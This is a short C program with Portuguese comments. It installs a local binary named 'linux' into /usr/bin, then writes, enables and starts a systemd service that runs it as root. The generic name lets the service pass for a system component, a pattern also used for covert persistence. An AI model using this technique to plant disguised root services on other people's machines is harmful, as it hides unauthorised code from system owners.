#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Conteúdo do arquivo linux.service
const char* linux_service_content = 
"[Unit]\n"
"Description=linux\n"
"\n"
"[Service]\n"
"Type=simple\n"
"User=root\n"
"ExecStart=/usr/bin/linux\n"
"\n"
"[Install]\n"
"WantedBy=multi-user.target\n";

int main() {
    // Criar e escrever o conteúdo do arquivo linux.service
    FILE *file = fopen("/etc/systemd/system/linux.service", "w");
    if (file) {
        fputs(linux_service_content, file);
        fclose(file);
    } else {
        perror("Erro ao criar o arquivo linux.service");
        return 1;
    }

    // Copiar o arquivo "linux" para /usr/bin/
    if (access("/usr/bin/linux", F_OK) != 0) {
        system("sudo cp linux /usr/bin/");
    }

    // Habilitar o serviço no systemd
    system("sudo systemctl enable linux.service");

    // Iniciar o serviço
    system("sudo systemctl start linux.service");

    return 0;
}
